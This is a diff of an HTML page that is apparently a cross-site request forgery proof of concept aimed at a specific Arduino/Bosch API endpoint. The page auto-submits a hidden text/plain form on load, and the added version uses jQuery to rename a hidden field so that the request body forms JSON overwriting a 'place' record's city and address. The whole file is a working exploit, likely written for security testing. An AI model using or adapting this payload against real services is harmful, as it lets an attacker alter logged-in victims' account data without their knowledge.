@@ -1,8 +1,17 @@
 <html>
-  <body>
-    <form action="https://bosch-api.arduino.cc/v1/places/708edcfc-1bab-4f9b-9240-e75342b1450c" method="PUT" enctype="text/plain">
-      <input type="hidden" name="{\"city\": hahahahaha,\"address\": \"thisisjustanothertest\"}" />
-    </form>
-    <script>document.forms[0].submit();</script>
-  </body>
+<head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+<script>
+$( document ).ready(function() {
+    $("#z").attr("name",'{"city":"hahahahaha","address":"lmaothisisatest","gateways":[],"');
+    $("#f").submit();
+});
+</script>
+</head>
+<body>
+<form id="f" ENCTYPE="text/plain" action="https://bosch-api.arduino.cc/v1/places/708edcfc-1bab-4f9b-9240-e75342b1450c" method="post">
+<input id="z" type="hidden" name='test' value='picture":""}'> 
+<input type="submit" value="send">
+</form>
+</body>
 </html>
